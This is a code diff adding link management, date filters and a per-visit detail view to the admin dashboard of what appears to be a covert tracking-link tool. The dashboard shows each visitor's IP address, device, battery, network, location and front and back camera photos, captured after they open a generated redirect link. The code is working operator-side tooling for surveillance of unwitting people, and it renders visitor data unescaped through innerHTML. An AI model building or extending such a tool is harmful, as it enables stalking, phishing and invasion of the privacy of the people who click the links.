@@ -1,6 +1,8 @@
 let socket;
 let currentVisitorId = null;
 let allUsersData = [];
+let currentFilter = 'all';
+let currentSort = 'newest';
 
 // ============================================
 // SOCKET CONNECTION
@@ -21,6 +23,7 @@ fetch('/api/users-data')
         displayAllUsers(data);
         updateUsersStats(data);
         populateStateFilter(data);
+        loadLinks();
     })
     .catch(() => {
         window.location.href = '/';
@@ -28,6 +31,7 @@ fetch('/api/users-data')
 
 socket.on('visitor-connected', () => {
     refreshAllData();
+    loadLinks();
     showNotification('🟢 New visitor connected!');
 });
 
@@ -49,10 +53,15 @@ socket.on('location-data', () => {
 function showTab(tab) {
     document.getElementById('dashboardTab').style.display = tab === 'dashboard' ? 'block' : 'none';
     document.getElementById('usersTab').style.display = tab === 'users' ? 'block' : 'none';
+    document.getElementById('linksTab').style.display = tab === 'links' ? 'block' : 'none';
     document.getElementById('tabDashboard').className = 'tab-btn' + (tab === 'dashboard' ? ' active' : '');
     document.getElementById('tabUsers').className = 'tab-btn' + (tab === 'users' ? ' active' : '');
+    document.getElementById('tabLinks').className = 'tab-btn' + (tab === 'links' ? ' active' : '');
     if (tab === 'users') {
         refreshAllData();
+    }
+    if (tab === 'links') {
+        loadLinks();
     }
 }
 
@@ -76,13 +85,75 @@ function generateCustomLink() {
         if (data.success) {
             document.getElementById('generatedLinkContainer').style.display = 'block';
             document.getElementById('generatedLink').value = data.link;
+            document.getElementById('generatedLinkId').textContent = data.linkId;
             document.getElementById('redirectUrlDisplay').textContent = data.redirectUrl;
-            showNotification('✅ Link generated successfully!');
+            showNotification('✅ Link generated successfully! Link ID: ' + data.linkId);
             refreshAllData();
+            loadLinks();
         }
     })
     .catch(error => {
         alert('Error: ' + error.message);
+    });
+}
+
+// ============================================
+// LOAD LINKS
+// ============================================
+function loadLinks() {
+    fetch('/api/links')
+        .then(response => response.json())
+        .then(links => {
+            displayLinks(links);
+        });
+}
+
+function displayLinks(links) {
+    const container = document.getElementById('linksList');
+    container.innerHTML = '';
+    
+    if (!links || links.length === 0) {
+        container.innerHTML = '<p style="color:#999; text-align:center; padding:40px;">No links generated yet.</p>';
+        return;
+    }
+    
+    links.forEach(link => {
+        const card = document.createElement('div');
+        card.className = 'visitor-card';
+        card.innerHTML = `
+            <div class="visitor-header">
+                <div>
+                    <strong>🔗 Link ID: ${link.linkId}</strong>
+                    <div style="font-size:14px; color:#666; margin-top:5px;">
+                        📌 ${link.link}
+                    </div>
+                    <div style="font-size:13px; color:#888; margin-top:3px;">
+                        🎯 Redirect: ${link.redirectUrl}
+                    </div>
+                </div>
+                <span style="padding:5px 10px; background:#48bb78; color:white; border-radius:5px; font-size:12px;">
+                    👥 ${link.totalVisits || 0} visits
+                </span>
+            </div>
+            <div style="display:flex; gap:10px; margin-top:10px; flex-wrap:wrap;">
+                <button onclick="copyToClipboard('${link.link}')" class="camera-btn" style="background:#48bb78;">📋 Copy Link</button>
+                <button onclick="searchByLinkId('${link.linkId}')" class="camera-btn" style="background:#667eea;">🔍 View Users</button>
+                <span style="font-size:12px; color:#888; padding:8px;">📅 ${new Date(link.createdAt).toLocaleString()}</span>
+            </div>
+        `;
+        container.appendChild(card);
+    });
+}
+
+function searchByLinkId(linkId) {
+    document.getElementById('searchUsers').value = linkId;
+    showTab('users');
+    setTimeout(() => searchUsers(), 500);
+}
+
+function copyToClipboard(text) {
+    navigator.clipboard.writeText(text).then(() => {
+        showNotification('📋 Link copied!');
     });
 }
 
@@ -136,6 +207,7 @@ function displayVisitors(visitors) {
                         📱 ${visitor.deviceName || 'Unknown'} 
                         ${visitor.ip ? `• 🌐 ${visitor.ip}` : ''}
                         ${visitor.totalVisits ? `• 🔄 ${visitor.totalVisits} visits` : ''}
+                        ${visitor.linkId ? `• 🔗 ${visitor.linkId}` : ''}
                     </div>
                     ${locationStr ? `<div style="font-size:13px; color:#888;">${locationStr}</div>` : ''}
                     ${visitor.battery ? `<div style="font-size:13px; color:#888;">🔋 ${visitor.battery}%</div>` : ''}
@@ -154,21 +226,59 @@ function displayVisitors(visitors) {
 }
 
 // ============================================
-// DISPLAY ALL USERS (Complete Data)
+// DISPLAY ALL USERS
 // ============================================
 function displayAllUsers(users) {
     const container = document.getElementById('allUsersList');
     container.innerHTML = '';
     
     if (!users || users.length === 0) {
-        container.innerHTML = '<p style="color:#999; text-align:center; padding:40px;">No users data available yet. Generate a link and share it!</p>';
+        container.innerHTML = '<p style="color:#999; text-align:center; padding:40px;">No users data available yet.</p>';
         document.getElementById('userCount').textContent = '(0)';
         return;
     }
     
-    document.getElementById('userCount').textContent = `(${users.length} users)`;
+    // Apply filters
+    let filteredUsers = [...users];
     
-    users.forEach(user => {
+    // Date filter
+    if (currentFilter !== 'all') {
+        const now = new Date();
+        const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
+        
+        filteredUsers = filteredUsers.filter(user => {
+            const visitDate = user.visitDate ? new Date(user.visitDate) : null;
+            if (!visitDate) return false;
+            
+            if (currentFilter === 'today') {
+                return visitDate >= today;
+            } else if (currentFilter === 'yesterday') {
+                const yesterday = new Date(today);
+                yesterday.setDate(yesterday.getDate() - 1);
+                return visitDate >= yesterday && visitDate < today;
+            } else if (currentFilter === '7days') {
+                const sevenDays = new Date(today);
+                sevenDays.setDate(sevenDays.getDate() - 7);
+                return visitDate >= sevenDays;
+            } else if (currentFilter === '30days') {
+                const thirtyDays = new Date(today);
+                thirtyDays.setDate(thirtyDays.getDate() - 30);
+                return visitDate >= thirtyDays;
+            }
+            return true;
+        });
+    }
+    
+    // Sort
+    if (currentSort === 'newest') {
+        filteredUsers.sort((a, b) => new Date(b.visitDate) - new Date(a.visitDate));
+    } else {
+        filteredUsers.sort((a, b) => new Date(a.visitDate) - new Date(b.visitDate));
+    }
+    
+    document.getElementById('userCount').textContent = `(${filteredUsers.length} users)`;
+    
+    filteredUsers.forEach(user => {
         const card = document.createElement('div');
         card.className = 'visitor-card';
         card.id = 'user-' + user.id;
@@ -189,6 +299,7 @@ function displayAllUsers(users) {
                     <div style="font-size:14px; color:#666; margin-top:5px;">
                         📱 ${user.deviceName || 'Unknown'} 
                         ${user.ip ? `• 🌐 ${user.ip}` : ''}
+                        ${user.linkId ? `• 🔗 ${user.linkId}` : ''}
                         ${visitCount > 0 ? `• 🔄 ${visitCount} visits` : ''}
                         ${lastVisit !== 'Never' ? `• 📅 Last: ${lastVisit}` : ''}
                     </div>
@@ -210,10 +321,32 @@ function displayAllUsers(users) {
                 ${user.frontCamera ? `<img src="${user.frontCamera}" style="max-width:60px; border-radius:5px;">` : ''}
                 ${user.backCamera ? `<img src="${user.backCamera}" style="max-width:60px; border-radius:5px;">` : ''}
             </div>
-            ${visitCount > 1 ? `<div style="margin-top:8px; font-size:12px; color:#888;">📋 ${visitCount} total visits. Click "Full Details" for history.</div>` : ''}
+            ${visitCount > 0 ? `<div style="margin-top:8px; font-size:12px; color:#888;">📋 ${visitCount} visits. Click "Full Details" for history.</div>` : ''}
         `;
         container.appendChild(card);
     });
+}
+
+// ============================================
+// FILTER FUNCTIONS
+// ============================================
+function filterVisits(filter) {
+    currentFilter = filter;
+    displayAllUsers(allUsersData);
+    const filterNames = {
+        'all': 'All',
+        'today': 'Today',
+        'yesterday': 'Yesterday',
+        '7days': 'Last 7 Days',
+        '30days': 'Last 30 Days'
+    };
+    showNotification(`📅 Filter: ${filterNames[filter] || filter}`);
+}
+
+function sortVisits(sort) {
+    currentSort = sort;
+    displayAllUsers(allUsersData);
+    showNotification(`🔄 Sort: ${sort === 'newest' ? 'Newest First' : 'Oldest First'}`);
 }
 
 // ============================================
@@ -299,11 +432,14 @@ function searchUsers() {
 function clearFilters() {
     document.getElementById('searchUsers').value = '';
     document.getElementById('filterState').value = '';
+    currentFilter = 'all';
+    currentSort = 'newest';
     searchUsers();
+    showNotification('🧹 Filters cleared');
 }
 
 // ============================================
-// SHOW USER DETAILS (Full History)
+// SHOW USER DETAILS
 // ============================================
 function showUserDetails(userId) {
     currentVisitorId = userId;
@@ -322,14 +458,17 @@ function showUserDetails(userId) {
                     const visitDate = visit.visitDate ? new Date(visit.visitDate).toLocaleString() : 'N/A';
                     const visitLoc = visit.location ? `${visit.location.city || ''} ${visit.location.state || ''}` : 'N/A';
                     visitHistoryHTML += `
-                        <div style="padding:8px; border-bottom:1px solid #eee; font-size:13px;">
-                            <strong>#${index + 1}</strong> 
-                            📅 ${visitDate} 
-                            ${visit.ip ? `• 🌐 ${visit.ip}` : ''}
-                            ${visitLoc !== 'N/A' ? `• 📍 ${visitLoc}` : ''}
-                            ${visit.battery ? `• 🔋 ${visit.battery}%` : ''}
-                            ${visit.frontCamera ? '• 📸 Front ✅' : ''}
-                            ${visit.backCamera ? '• 📸 Back ✅' : ''}
+                        <div style="padding:8px; border-bottom:1px solid #eee; font-size:13px; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:5px;">
+                            <div>
+                                <strong>#${index + 1}</strong> 
+                                📅 ${visitDate} 
+                                ${visit.ip ? `• 🌐 ${visit.ip}` : ''}
+                                ${visitLoc !== 'N/A' ? `• 📍 ${visitLoc}` : ''}
+                                ${visit.battery ? `• 🔋 ${visit.battery}%` : ''}
+                            </div>
+                            <button onclick="showVisitDetails('${userId}', ${index})" class="camera-btn" style="background:#667eea; padding:3px 10px; font-size:12px;">
+                                👁️ View
+                            </button>
                         </div>
                     `;
                 });
@@ -344,6 +483,7 @@ function showUserDetails(userId) {
                         <h3>👤 User Information</h3>
                         <div class="visitor-details-grid">
                             <div class="detail-card"><label>🆔 ID</label><div class="value">${user.id}</div></div>
+                            <div class="detail-card"><label>🔗 Link ID</label><div class="value">${user.linkId || 'N/A'}</div></div>
                             <div class="detail-card"><label>📱 Device</label><div class="value">${user.deviceName || 'N/A'}</div></div>
                             <div class="detail-card"><label>🌐 IP Address</label><div class="value">${user.ip || 'N/A'}</div></div>
                             <div class="detail-card"><label>📶 Network</label><div class="value">${user.network?.effectiveType || user.network?.type || 'N/A'}</div></div>
@@ -402,6 +542,40 @@ function showUserDetails(userId) {
                 </div>
             `;
             container.innerHTML = html;
+        });
+}
+
+// ============================================
+// SHOW VISIT DETAILS (Modal)
+// ============================================
+function showVisitDetails(userId, visitIndex) {
+    fetch(`/api/visitor/${userId}`)
+        .then(response => response.json())
+        .then(user => {
+            const visit = user.visitHistory[visitIndex];
+            if (!visit) {
+                alert('Visit not found');
+                return;
+            }
+            
+            const modal = document.getElementById('visitModal');
+            const content = document.getElementById('visitDetailsContent');
+            
+            content.innerHTML = `
+                <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px;">
+                    <div class="detail-card"><label>📅 Visit Date</label><div class="value">${visit.visitDate ? new Date(visit.visitDate).toLocaleString() : 'N/A'}</div></div>
+                    <div class="detail-card"><label>🌐 IP Address</label><div class="value">${visit.ip || 'N/A'}</div></div>
+                    <div class="detail-card"><label>📱 Device</label><div class="value">${visit.deviceInfo?.deviceName || visit.deviceInfo?.platform || 'N/A'}</div></div>
+                    <div class="detail-card"><label>🔋 Battery</label><div class="value">${visit.battery || 'N/A'}%</div></div>
+                    <div class="detail-card"><label>📶 Network</label><div class="value">${visit.network?.effectiveType || visit.network?.type || 'N/A'}</div></div>
+                    <div class="detail-card"><label>📍 Location</label><div class="value">${visit.location ? `${visit.location.city || ''} ${visit.location.state || ''} ${visit.location.country || ''}` : 'N/A'}</div></div>
+                    ${visit.frontCamera ? `<div class="detail-card"><label>📸 Front Photo</label><div class="value"><img src="${visit.frontCamera}" style="max-width:150px; border-radius:5px; margin-top:5px;"></div></div>` : ''}
+                    ${visit.backCamera ? `<div class="detail-card"><label>📸 Back Photo</label><div class="value"><img src="${visit.backCamera}" style="max-width:150px; border-radius:5px; margin-top:5px;"></div></div>` : ''}
+                    <div class="detail-card"><label>🔄 Redirect Complete</label><div class="value">${visit.redirectComplete ? '✅ Yes' : '❌ No'}</div></div>
+                </div>
+            `;
+            
+            modal.style.display = 'flex';
         });
 }
 
@@ -549,4 +723,7 @@ function showNotification(message) {
 loadVisitors();
 updateStats();
 
-setInterval(refreshAllData, 15000);
+setInterval(() => {
+    refreshAllData();
+    loadLinks();
+}, 15000);
